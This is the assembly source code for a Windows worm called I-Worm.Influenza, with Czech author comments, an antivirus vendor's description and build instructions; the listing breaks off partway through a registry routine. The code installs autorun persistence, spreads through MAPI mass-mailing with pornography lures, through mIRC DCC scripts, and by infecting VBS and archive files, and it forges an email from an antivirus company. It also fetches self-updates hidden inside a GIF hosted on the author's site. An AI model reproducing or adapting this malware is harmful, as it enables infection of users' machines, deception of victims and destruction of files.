;³INFLUENZA³
;ÀÄÄÄÄÄÄÄÄÄÙ
;
; INTRODUCTION
; ÄÄÄÄÄÄÄÄÄÄÄÄ
;
; Influenza commonly known as the flu is an infectious disease caused
; by the influenza virus.
; During a serious epidemic may cause 1000-2000 deaths.
; The virus is constantly changing due to mutation.
; The only measure against Influenza is vaccination and prevention.
;
; I-WORM.INFLUENZA by Radix16[MIONS]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
; Tak tohle je muj prvni I-Worm, nektere veci nejsou dodelane, protoze jsem
; ho mel uz plne zuby :). Worm se updatuje s mych stranek, tagze gdyz neco
; dodelam tak to muzu dat v podobe updejtu. Updejt jeste nemam moc vyresen.
; Zatim to delam tak, ze zmenim start page a pri spusteni Internet Explorer
; se nacte ma stranka, kde je update.gif. Na konci toho souboru je normalni
; binarni kod ktery s tama vycucnu. Ale nejprve ten gif musim najit v
; Temporary Internet Files.
;
; Worm se skopiruje : C:\WINDOWS\Pornochat.exe
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ   C:\WINDOWS\SYSTEM\napster.exe
;                                       game.exe
;                                       ....
; IRC script :        C:\mirc32\script.ini
; ÄÄÄÄÄÄÄÄÄÄ          C:\mirc\script.ini
;                     C:\Program Files\mirc\script.ini
;                     C:\Program Files\mirc32\script.ini
;
; Worm posila IRcekem soubor NewFilmMatrix2.scr
;
; VBS infect :        C:\WINDOWS\*.vbs
; ÄÄÄÄÄÄÄÄÄÄ          C:\WINDOWS\SYSTEM\*.vbs
;
; Worm se zapise do VBSka v hexadecimalnim tvaru.
;
; Archive :           *.rar
; ÄÄÄÄÄÄÄ             *.arj
;
; V aktualnim adresari infikuje tyhle archivy RAR&ARJ. V prvni verzi, ktera
; byla sverejnena na mych strankach, byla nalezena chyba. Worm mel velikost
; 7000h a ja jsem tam mel napsane 6000h.
;
; InfluenzaCryptoLab.exe :
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
; Tohle je jenom ukazka co se fsechno da udelat pres registry. Ja jsem tam
; dal jenom jeden klic a neni problem tam dat nejakej generator.
; Jedna se vlastne o jeden soubor, ktery ridi vsechno spusteni souboru.
; Mozna se to da i nazvat trochu residence :).
;
; vytvori se soboubor :
;
;                     C:\InflunzaCryptoLab.exe
;
; Mimochodem jsem si vsiml ze mi tam chybi pismeno e :)
; Tenhle soubor nesmite smazat jinac zadnou aplikaci uz nespustite :)
;
; ÃÄÄÄÄÄÄÄ´
;
; Jinac je v nem hodne zbytecnych textum, ale uz to mazat nebudu vzniklo by
; hodne zbytecnych variant. A sireni OE nema taky dotahle, jenom si muzete
; vsimnout jaky text by obsahoval (AVG). Treba to dam do nejakeho updejtu :)
;
; AVP dalo wormu jmeno Desant i kdyz, se tenhle nazev vubec nevyskytuje v
; binarce. Je to napsane jenom na mych strankach jako Project. Tim tedy
; dekuji AVP za navstevu mych stranek. :)
;
; ÃÄÄÄÄÄÄÄ´
;
; Diky napsani tohohle wormu, jsem pomalu poznaval, jak co urychlit finty
; atd.. tagze to znamena, ze priste to bude mozna lepsi :)
;

; AVP description
; ~~~~~~~~~~~~~~~
;
; This is worm virus spreading being attached to Email messages, through IRC channels, 
; infecting PE EXE files (Win32 executable files), VBS files and incorporating its 
; copies to RAR and ARJ archives. The worm itself is Win32 executable file about 28Kb 
; of length, and it infects Win32 machines only.
;
; The worm has many bugs and in most of cases crash the system or corrupt files while infecting them.
;
; Installing
; ~~~~~~~~~~
;
; When infected file is run, the worm copies itself to Windows system directory with one
; of the names randomly selects from following list depending on current day:
;
; napster.exe
; newbillgates.exe
; HonNaCigana2.exe
; FreeSoftGSM.exe
; game.exe
; call.exe 
;
; To access that copy later by its name the worm stores that name in Registry key:
;
; HKLM\SOFTWARE\InfluenzaLab
; MicrosoftOE = %wormname% 
;
; where %wormname% is the file name of worm copy (it will be used below as well).
; The worm also copies itself to Windows directory with PornoChat.exe name and 
; registers that file in Registry auto-run key:
; HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
; MicrosoftOE = %WinDir%\PornoChat.exe 
;
; Updating
; ~~~~~~~~ 
;
; The worm is able to update itself. To do that it sets start page for MS Internet 
; Explorer to "www.volny.cz/radix16/flu/update.gif". As a result on each Internet Explorer
; that GIF file is downloaded to affected machine. The worm then copies that file with 
; C:\updateFLU.gif name and processes it. That can be not usual GIF image file - the 
; worm looks for data that is attached to main GIF image data. The attached data has special
; format. It may contain a list of email addresses (it is stored to C:\Heyya.txt file and
; is used later) and/or EXE file image.


;
; How to compile :
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
; tasm32 -ml -m5 flu.asm
; tlink32 -Tpe -aa -c -x flu,flu,, import32.lib,, influ.res
; pewrsec flu.exe
;
; Greets to :
; ÄÄÄÄÄÄÄÄÄ
;
; bumblebee - it's lame ?
; sh!tdown - heya linux man :)
; worf - Stop create new virus variant ! :))
; gl_storm - ASM rulesssss...... !
; ratter - zhul!!.. :)
; Odehnal - sorry ! :)
;
; Conact me :
; ÄÄÄÄÄÄÄÄÄ
;
; radix16@atlas.cz
; radix16.cjb.net

; Thanks Venca my Beta tester :)
; !!!Prominte za pravopis!!! sux CJ

                .386p
                locals
                jumps
                .model  flat,STDCALL


;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ Potrebne API                                                              ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

                extrn   ExitProcess:PROC
                extrn   GetLastError:PROC
                extrn   CreateFileMappingA:PROC
                extrn   MapViewOfFile:PROC
                extrn   UnmapViewOfFile:PROC
                extrn   GetFileSize:PROC
                extrn   SetEndOfFile:PROC
                extrn   FindClose:PROC
                extrn   SetFileAttributesA:PROC
                extrn   SetFileTime:PROC
                extrn   GetModuleHandleA:PROC
                extrn   GetCurrentDirectoryA:PROC
                extrn   GetWindowsDirectoryA:PROC
                extrn   GetSystemDirectoryA:PROC
                extrn   SetCurrentDirectoryA:PROC
                extrn   GetSystemTime:PROC
                extrn   FindFirstFileA:PROC
                extrn   FindNextFileA:PROC
                extrn   CreateFileA:PROC
                extrn   WriteFile:PROC
                extrn   ReadFile:PROC
                extrn   CopyFileA:PROC
                extrn   MoveFileA:PROC
                extrn   CreateFileA:PROC
                extrn   CloseHandle:PROC
                extrn   SetFilePointer:PROC
                extrn   DeleteFileA:PROC
                extrn   GetDriveTypeA:PROC


                extrn   RegQueryValueExA:PROC
                extrn   RegOpenKeyExA:PROC
                extrn   RegCreateKeyExA:PROC
                extrn   RegSetValueExA:PROC
                extrn   RegCloseKey:PROC

                extrn   CreateThread:PROC
                extrn   WaitForSingleObject:PROC

                extrn   FindWindowA:PROC
                extrn   PostMessageA:PROC
                extrn   MessageBoxA:PROC
                extrn   DeviceIoControl:PROC
                extrn   WinExec:PROC

                extrn   LoadLibraryA:NEAR
                extrn   FreeLibrary:NEAR

                extrn   MAPILogon:PROC
                extrn   MAPILogoff:PROC
                extrn   MAPISendMail:PROC

                extrn   lstrcpyA:PROC
                extrn   GetCommandLineA:PROC
;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³  DATA section                                                             ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

 .Data



        _coded  db      'INFLUENZA by Radix16[MIONS]',0
        _text   db      'Hello, it is my first [Internet] Worm.',0dh
                db      'I am sorry Bumblebee/29A(Win95.Radix) ',0

        szFileName db 100 dup (00)


        _file_namez:
        _@1     db 'napster.exe',0
        _@2     db 'newbillgates.exe',0
        _@3     db 'HonNaCigana2.exe',0
        _@4     db 'FreeSoftGSM.exe',0
        _@5     db 'game.exe',0
        _@6     db 'call.exe',0
                db 'NewFilmMATRIX2.scr',0
                db 0BFh

        CreateMatrix   db 'C:\NewFilmMATRIX2.scr',0
        _wormspr       db '\PornoChat.exe',0
        updateexe      db 'C:\update.exe',0

        JPG_FILES      db '*.jpg',0

        _tmpfile:
                       db 'C:\mail.tmp',0


        _mirc_         db 'C:\mirc\script.ini',0
        _mirc32_       db 'C:\mirc32\script.ini',0
        _mprog_        db 'C:\Program Files\mirc\script.ini',0
        _mprog32_      db 'C:\Program Files\mirc32\script.ini',0

        trstd           dd 0
        MAPISession     dd 0

        MapiMessage     equ $

                        dd ?
                        dd offset subject_
                        dd offset Notetex_
                        dd ?
                        dd offset Datehou_
                        dd ?
                        dd 2
                        dd offset MsgFrom
                        dd 1
                        dd offset MsgTo
                        dd 1
                        dd offset MapiFileDesc

        MsgFrom         equ $

                        dd ?
                        dd ?
                        dd offset NameFrom
                        dd offset MailFrom
                        dd ?
                        dd ?

        MsgTo           equ $

                        dd ?
                        dd 1
                        dd offset NameTo
                        dd offset emailtosend
                        dd ?
                        dd ?

        MapiFileDesc    equ $

                        dd ?
                        dd ?
                        dd ?
                        dd offset _buf_path
                        dd ?
                        dd ?


        subject_:
                        db 'Pornocity',0
        Notetex_:
                        db ' Hi friend, new real pornochat + live cam.! FREE',0

        Datehou_        db '21/9/2000',0
        NameFrom        db 'Pornocity',0
        MailFrom        db 'Pornocity@Pornocity.cz',0
        NameTo          db 'friends',0

 __DCC:

                        db '[script]',0dh,0ah
                        db ';Warning! Warning!',0dh,0ah
                        db ';Dont delete file script.ini',0dh,0ah
                        db 'n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }',0dh,0ah
                        db 'n1=/dcc send $nick '
        FileExists      db 'C:\NewFilmMATRIX2.scr',0dh,0ah
                        db         '}'

        _END_DCC:

        _Outlook_DBX:

        _HeadX:
                db      0CFh,0ADh,12h,0FEh,0C5h,0FDh,74h,6Fh,66h,0E3h,0D1h,11h,9Ah,4Eh,00,0C0h
                db      04Fh,0A3h,09h,0D4h,05h,00,00,00,05h,00,00,00,18h,06h,00,00
                db      00,00,00,00,0D4h,2Ah,00,00,00,0C0h,00,00,0F0h,02h,00,00
                db      54h,0E2h,01,00,1Ch,3Eh,00,00,7Ch,02,00,00,0D4h,0EAh,00,00
                db      80h,0F7h,00,00,30h,06h,00,00,00,00,00,00,00,00,00,00
                db      00,00,00,00,9Ch,0Bh,00,00,00,00,00,00,02h,00,00,00
                db      00,00,00,00,01,00,00,00,00,00,00,00,00,00,00,00
                db      00,00,00,00,00,00,00,00,00,00,00,00,70h,20h,02h,00
                db      02,00,00,00,00,00,00,00,0D4h,2Ah,00,00,00,00,00,00
                db      16 dup (00)
                db      16 dup (00)
                db      16 dup (00)
                db      00,00,00,00,01,00,00,00,00,00,00,00,00,00,00,00
                db      16 dup (00)
                db      00,00,00,00,54h,0E2h,01,00,00,00,00,00,00,00,00,00
                db      16 dup (00)
                db      8 dup (00),01,7 dup (00)

         _HeadX_End:

         _HeadX_Size equ offset _HeadX_End - offset _HeadX

         l_s    db      03,'LocalStore'
         p_k_o  db      00,'Po‘ta k odesl£nô'

         _HeadXX:
                db      0D4h,2Ah,00,00,'H'
                db      00,00,00
                db      '((MSGCOL_FLAGS & ARF_WATCH) != 0 || (MSGCOL_FLAGS & ARF_IGNORE) != 0)'
                db      00,65h,7ch,24h,2Bh,00,00,94h,02h,00,00,00,00,11h,01h
                db      80h,02h,00,00,81h,09h,00,01h,02h,00,00,00,84h,0D4h,0EAh,00
                db      05h,08h,00,00,06h,0Bh,00,00,08h,13h,00,00,0Dh,16h,00,00
                db      0Eh,20h,00,00,90h,03h,00,00,91h,2Bh,05,00,12h,33h,00h,00
                db      13h,3Bh,00,00,14h,93h,00,00,1Ah,0F5h,00,00,1Bh,03h,01h,00
                db      1Ch,0Ch,01h,00,60h,97h,14h,5Fh,9Ah,88h,0C0h,01h,48h,49h,00h,00h
                db      88h,2Eh,5Fh,9Ah,88h,0C0h,01h,'HI',00
                db      'Influenza',00,'Influenza@atlas.cz',00,60h,97h,14h,5Fh,9Ah,88h,0C0h,01h

         _HeadXX_End:

         _HeadXX_Size equ offset _HeadXX_End - offset _HeadXX



         _HeadXXX:

    POP3ATLAS  db      00,'POP3.Atlas.cz',00,'00000001',00,40h,01h,00,00,01h,00,64h,33h,00,00,00,00,2Bh,05h,00,00
               db      64h,33h,01h,00,03h,00,00,00,8 dup (00)
               db      16 dup (00)
               db      8 dup (00),64h,33h,01h,00,64h,33h,02h,00
               db      8 dup (00),00,00,00,00,63h,03,00,00
               db      0FAh,04h,00,00,03h,03h,00,00, 00,00,00,00,04h,00,00,00
               db      0D6h,02h,6 dup (00), 8 dup (00)
               db      16 dup (00)
               db      16 dup (00)
               db      02,7 dup (00),8 dup (0)
               db      64h,33h,02h,00,64h,33h,00,00,0D5h,01h,00,00,2Bh,05h,00,00
               db      8 dup (00),01h, 7 dup (00)
               db      16 dup (00)
               db      16 dup (00)
               db      16 dup (00)
               db      64h,33h,01h, 5 dup (00),64h,33h, 6 dup (00)
               db      00,00,00,00,93h,01h,00,00,0D4h,02h,00,00,32h,02h,00,00
               db      00,00,00,00,04h,00,00,00,05h,02h, 6 dup (00)
               db      16 dup (00)
               db      16 dup (00), 4 dup (00), 08,8Bh,80,0F0h

         _HeadXXX_End:

         _HeadXXX_Size equ offset _HeadXXX_End - offset _HeadXXX

        _maildoc:
                db      'From: "Grisoft" <fpl@grisoft.cz>',0dh,0ah
                db      'To:',0dh,0ah
                db      'Subject: !!Virus INFLUENZA!!',0dh,0ah
                db      'Date:',0dh,0ah
                db      'MIME-Version: 1.0',0dh,0ah
                db      'Content-Type: multipart/mixed;',0dh,0ah
                db      '       boundary="----=_NextPart_000_0007_'
                db      '01C06F8A.306A0B80"',0dh,0ah
                db      'X-Priority: 3',0dh,0ah
                db      'X-MSMail-Priority: Normal',0dh,0ah
                db      'X-Mailer: Microsoft Outlook Express'
                db      '5.00.2314.1300',0dh,0ah
                db      'X-MimeOLE: Produced By Microsoft MimeOLE'
                db      'V5.00.2314.1300',0dh,0ah
                db      '',0dh,0ah
                db      'This is a multi-part message in MIME format.',0dh,0ah
                db      ''
                db      'Content-Type: text/plain;',0dh,0ah
                db      '       charset="iso-8859-2"',0dh,0ah
                db      'Content-Transfer-Encoding: quoted-printable',0dh,0ah
                db      '',0dh,0ah

                db      'Mili pratele!',0dh
                db      'Chteli bychom vas upozornit na nebezpeci nakazy wormem INFLUENZA, ktery',0dh
                db      'se nevidane rozsiril v Ceske republice.Pokud na nej narazite poslete nam prosim hlaseni.',0dh
                db      'Jeste, Vam zasilame prislusny soubor, ktery dovede odstranit worma (ale neni to jiste). ',0dh
                db      ' S pozdravem',0dh
                db      '                         Grisoft team'
                db      '',0dh,0ah
                db      '------=_NextPart_001_0008_01C06F8A.306A0B80',0dh,0ah
                db      'Content-Type: text/html;',0dh,0ah
                db      '       charset="iso-8859-2"',0dh,0ah
                db      'Content-Transfer-Encoding: quoted-printable',0dh,0ah
                db      '',0dh,0ah
                db      '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML'
                db      '4.0 Transitional//EN">',0dh,0ah
                db      '<HTML><HEAD>',0dh,0ah
                db      '<META content=3D"MSHTML 5.00.2314.1000"'
                db      'name=3DGENERATOR>'
                db      '<STYLE></STYLE>',0dh,0ah
                db      '</HEAD>',0dh,0ah
                db      '<BODY bgColor=3D#ffffff>',0dh,0ah
                db      '<DIV><FONT face=3D"Arial CE" size=3D2>',0dh,0ah
                db      '</FONT></DIV></BODY></HTML>',0dh,0ah
                db      ''

                _size_maildoc   =       $-_maildoc

                FALSE           equ     00h
                NULL            equ     00h
                MAX_PATH        equ     256

        FILETIME struct
                dwLowDateTime   DWORD   ?
                dwHighDateTime  DWORD   ?
        FILETIME ends

        WIN32_FIND_DATA struct
                dwFileAttributes        DWORD   ?
                ftCreationTime          FILETIME <>
                ftLastAccessTime        FILETIME <>
                ftLastWriteTime         FILETIME <>
                nFileSizeHigh           DWORD   ?
                nFileSizeLow            DWORD   ?
                dwReserved0             DWORD   ?
                dwReserved1             DWORD   ?
                cFileName               BYTE MAX_PATH dup(?)
                cAlternate              BYTE 0eh dup(?)
        ends

        SYSTEMTIME struct

                wYear                 WORD    ?
                wMonth                WORD    ?
                wDayOfWeek            WORD    ?
                wDay                  WORD    ?
                wHour                 WORD    ?
                wMinute               WORD    ?
                wSecond               WORD    ?
                wMilliseconds         WORD    ?

        ends

                MAPIMail:

                    hMAPISession                  dd 00000000h



          _VXD:
                    Dummy                           dd      ?

        _DBX_DATA:

                _user                   db      'User.dat',0
                _adressbook             db      '\Application Data\Microsoft\'
                                        db      'Address Book\UserMPS.wab',0
                _Outlook_Express        db      '\Microsoft\Outlook Express\',0
                _identit1               db      'Start As',0
                _identit2               db      'Default User ID',0
                _lastuser               db      'Last User ID',0
                _Username               db      'Username',0
                _CZ_file                db      'Po‘ta kodesl£nô.dbx',0
                _AccountName            db      'Account Name',0
                _SMTPDisplayName        db      'SMTP Display Name',0
                _SMTPEmailAddress       db      'SMTP Email Address',0
                _StoreRoot              db      'Store Root',0
                _pointer_edx            dd      0
                _number                 dd      0
                _filehandle             dd      0
                number                  dd      0
                h_Key                   dd      ?
                tmp                     dd      ?
                NumberOfBytesRead       dd      ?
                Test_1                  dd      0
                min20                   dd      0
                    lpParameter             dd      00000000h
                lpThreadId              dd      00000000h
                _sysdir                 db      100 dup (00)
                _windir                 db      100 dup (00)
                _ctrdir                 db      100 dup (00)
                regFile:
                _buf_path               db      100 dup (00)
                regVal                  db      'MicrosoftOE',0
                regSize = $-regFile


                HKEY_CURRENT_USER       EQU 80000003h
                KEY_ALL_ACCESS          EQU 0F003FH

                filestarts:


                KeyRun                  db 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0

               _run_worm                db 'SOFTWARE\InfluenzaLab',0

                key_handle              dd 0

                KEY1                    db "",0

                KEY                     db ".Default\Identities\", 0

                key_data                db 260 dup(0)
                key_len                 dd 260
                key_name1               db "Store Root",0
                key_name                db "Last User ID", 0

                key_type                dd 0

virus_start:

                        db      0B8h
oldeip                  dd      00000000h
                        add     eax,00400000h
                        jmp     eax

                        db      1060 dup (?)    ; virus' data
virus_virtsize          equ     $-virus_start

                ReadBinaryBuff          db      7000h dup (?)
                virus_size              equ     $-virus_start
                buffer                  db      600h dup (?)
                email                   db      191188 dup (?)
                VBSFILEZ                db      40000 dup (?)
                MailTemporar            db      10000 dup (?)

                FindFileData            WIN32_FIND_DATA <>
                SystemTime              SYSTEMTIME <>

                updatertext             db      5000 dup (?)


.Code
        _Start_Iworm:

                push    NULL                   ;
                                               ;
                call    GetModuleHandleA       ;

                call    GetCommandLineA        ; Vrati ukazatel na
                mov     esi,eax                ; Command-Line

                cmp     byte ptr [esi+01h],':' ; UNC?
                je      lstrcpyA_

                inc     eax
                lea     esi,szFileName
   lstrcpyA_:
                push    eax
                push    offset szFileName
                call    lstrcpyA

                mov     ecx,100
                sub     esi,esi
                mov     edi,offset szFileName
   NameCreater:
                mov     bl,[edi + esi]
                cmp     bl,22h
                je      it20h
                inc     esi
                loop    NameCreater

                jmp     NameisComplete

it20h:
                mov     bl,00
                mov     [edi + esi],bl



NameisComplete:
                                                                       ;
                Push    offset SystemTime      ;
                                               ;
                Call    GetSystemTime          ;
                                               ;
                cmp     byte ptr [SystemTime.wMonth],10
                jne     _Next_V                ;
                cmp     byte ptr [SystemTime.wDay],26
                jne     _Next_V                ;
                                               ;
                                               ;
        _message_boxes:                        ;
                push    0                      ;Jedna se o tlacitlo OK
                push    offset _coded          ;Kdo z placnul
                push    offset _text           ;Manifest :)
                push    0                      ;Obycejny MessageBox Zadnej Error :)
                                               ;
                call    MessageBoxA            ;USER32 API, no proste MessageBox hehe
                                               ;
        _Next_V:                               ;
                mov     edx,offset szFileName ;_file_namezNejprve zistime jaxe vubec jmenuju :)
                xor     edi,edi                ;edi=0
                                               ;
        _FindWorm:                             ;Tak ja jed, hledej co je prvni na

                push    offset FindFileData    ;offsetu edx
                push    edx                    ;
                                               ;
                call    FindFirstFileA         ;Kernel32 API, hledej prvni soubor
                                               ;
                                               ;
        _NewName?:                             ;
                inc     eax                 ;jestli je v eax -1 tak jsme nic nenasli
                je      _set_file              ;nasli/nenasli
                dec     eax



        _Get_Windows_Directory:                ;
                push    100                    ;
                push    offset _windir         ;
                                               ;
                call    GetWindowsDirectoryA   ;
                                               ;
        _Get_System_Directory:                 ;
                push    100                    ;velikost buffru
                push    offset _sysdir         ;
                                               ;
                call    GetSystemDirectoryA    ;Kernel32 API, zjisti system adresar
                                               ;C:\WINDOWS\SYSTEM
                mov     edx,offset _sysdir
                call    _create_path           ;volej moji proceduru, ktera vytvori
                                               ;celou cestu, potrebnou ke kopirovani
                lea     esi,[FindFileData.cFileName]  ;Jmeno cerva bude v esi
                                               ;
        _CopyFile:                             ;
                push    FALSE                  ;
                push    offset _buf_path       ;Cela cesta i s novym jmenem
                push    esi                    ;Vloz meno cerva,ke kopirovani
                                               ;
                call    CopyFileA


                mov     edx,offset _run_worm
                call    _reg_key

                lea     esi,[FindFileData.cFileName]

                push    FALSE
                push    offset CreateMatrix
                push    esi

                call    CopyFileA

                call    WormSrpreadname

                lea     esi,[FindFileData.cFileName]

                push    FALSE
                push    offset _buf_path
                push    esi
                call    CopyFileA

                xor     ebx,ebx

                push    ebx                    ;0
                push    00000080h              ;
                push    3                      ;
                push    ebx                    ;0
                push    ebx                    ;0
                push    GENERIC_READ + GENERIC_WRITE
                push    offset tesF            ;jake jmeno souboru

                call    CreateFileA

                mov     dword ptr [_filehandle],eax

                mov     edx,1000

                push    00h
                push    offset number
                push    edx
                push    offset _emailto
                push    dword ptr [_filehandle]
                call    ReadFile
                                               ;
                push    dword ptr [_filehandle]
                call    CloseHandle

repeatsend:
                xor     edi,edi
                mov     esi,esireg___
                mov     edx,offset _emailto

        _das_asd1:
                mov     al,[edx + esi]
                cmp     al,00
                je      testing12
                mov     [emailtosend + edi],al

                inc     edi
                inc     esi

                jmp     _das_asd1

        testing12:
                inc     esi
                mov     al,[edx + esi]
                cmp     al,00
                je      __asdvuix

                mov     esireg___,esi

                xor     eax,eax
                push    dword ptr [MAPISession]
                push    eax
                push    eax
                push    eax                     ; password
                push    eax                     ; username
                push    eax
                call    MAPILogon


                xor     eax,eax
                push    eax
                push    eax
                push    offset MapiMessage
                push    eax
                push    dword ptr [MAPISession]
                call    MAPISendMail


                xor     eax,eax
                push    eax
                push    eax
                push    eax
                push    dword ptr [MAPISession]
                call    MAPILogoff


                jmp     repeatsend
__asdvuix:


                call    _start_infect          ;
                                               ;
        _jmp_to_exit:                          ;

                jmp     _exit_wrm              ;uf probehloto asi bez problemu

;'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||-
;?Get Worm name                                                              ?
;›|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||ƒ


        _set_file:                             ;
                xor     esi,esi                ;vynuluj esi
                mov     edx,offset _file_namez ;tak nastav ten ukakazatel
                add     edx,edi                ;pricti minule pocitani
                                               ;
        _set_pointer:                          ;
                mov     bl,[edx + esi]         ;hod mi do bl instrukci kde je ukazatel
                or      bl,bl                   ;Uz jsem sakra na nule
                je      _ok_gogo               ;ano/ne
                inc     esi                    ;pusunem se o dalsi bajt dopredu
                                               ;
                jmp     _set_pointer           ;opakujem porad dokud nenarazime na nulu
                                               ;
        _ok_gogo:                              ;
                inc     esi                    ;Nastav Ukazatel na Nove jmeno
                add     edx,esi                ;Souboru
                add     edi,esi                ;
                                               ;
                jmp     _FindWorm              ;ok jdem hledat

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Name to  attach                                                            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


 WormSrpreadname:                                              ;
                mov     ecx,100
                xor     edi,edi

kdskld_:
                mov     [edi + _buf_path],00
                inc     edi
                loop    kdskld_


                mov     edx,offset _windir
                xor     esi,esi
                xor     edi,edi

       _loop_crx:                               ;
                mov     bl,[edx + esi]         ;precti hodnotu
                or      bl,bl                   ;narazili jsme na nulu
                je      _next_crx               ;ano or ne ?
                mov     [_buf_path + edi],bl   ;vloz prectenou hodotu do pole
                inc     esi                    ;+1
                inc     edi                    ;+1
                                               ;
                jmp     _loop_crx               ;skoc na _loop_cr
                                               ;a opakuj to dukut nenarazim
        _next_crx:                              ;na nulu
                                               ;
                mov     edx,offset _wormspr ;vloz ukazatel na adressbook
                xor     esi,esi                ;nuluj esi
                                               ;
        _loop_crsx:                             ;
                mov     bl,[edx + esi]         ;prvni hodnota v edx do bl
                or      bl,bl                  ;je tam nula
                je      _next_crsx              ;ano or ne ?
                mov     [_buf_path + edi],bl   ;vloz hodnotu bl do pole
                inc     esi                    ;+1
                inc     edi                    ;+1
                                               ;
                jmp     _loop_crsx              ;a do kola, zase
                                               ;dukud nebude
        _next_crsx:                             ;nula
                ret                                           ;


;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Create Copy path                                                           ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        _create_path:
                xor     esi,esi                ;tak ok vsechno si zase vynuluju
                mov     edi,esi                ;nulu hodim take do edi
                                               ;
        _create_pth:                           ;
                mov     al,[edx + esi]         ;do al istrukci
                or      al,al                   ;je to nula
                je      _updata_path           ;kdyz je skoc na _updata_path
                mov     [_buf_path + edi],al   ;instrukce hazejme do buffru
                inc     esi                    ;+1
                inc     edi                    ;+1
                jmp     _create_pth            ;jedeme dokolecka do kola
                                               ;
        _updata_path:                          ;
                mov     al,'\'                 ;nezapomen na lomitko jinac by cesta
                mov     [_buf_path + edi],al   ;vypadala takto C:\Windows\SystemNap.exe
                inc     edi                    ;spravne to je C:\Windows\System\Nap.exe
                xor     esi,esi                ;esi=0
                                               ;
                mov     edx,offset _@1         ;Ukaz na jmena souboru
                                               ;
                cmp     byte ptr [SystemTime.wDay],4
                jne     _Next_8                ;
                                               ;
                mov     edx,offset _@2         ;
                                               ;
        _Next_8:                               ;
                cmp     byte ptr [SystemTime.wDay],8
                jne     _Next_12               ;
                                               ;
                mov     edx,offset _@3         ;
                                               ;
        _Next_12:                              ;
                cmp     byte ptr [SystemTime.wDay],12
                jne     _Next_16               ;
                                               ;
                mov     edx,offset _@4         ;
                                               ;
        _Next_16:                              ;
                cmp     byte ptr [SystemTime.wDay],16
                jne     _Next_20               ;
                                               ;
                mov     edx,offset _@5         ;
                                               ;
        _Next_20:                              ;
                cmp     byte ptr [SystemTime.wDay],20
                jne     _Next_24               ;
                                               ;
                mov     edx,offset _@6         ;
                                               ;
        _Next_24:                              ;
                cmp     byte ptr [SystemTime.wDay],24
                jne     _updata_pth            ;
                                               ;
                mov     edx,offset _@1         ;
                                               ;
        _updata_pth:                           ;A jdem doplnit full path
                mov     al,[edx + esi]         ;je to uplnej system jako u fseho
                or      al,al                   ;tagze to nemusi vysvetlovat
                je      _cancel_creat          ;
                mov     [_buf_path + edi],al   ;
                inc     edi                    ;
                inc     esi                    ;
                jmp     _updata_pth            ;
                                               ;
        _cancel_creat:                         ;
                ret                            ;Tak a jdem zpet
                                               ;


;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³RegSetup                                                                   ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

     _reg_key:                                 ;
                xor     eax,eax                ;eax=0
                                               ;
                push    offset tmp             ;
                push    offset h_Key           ;
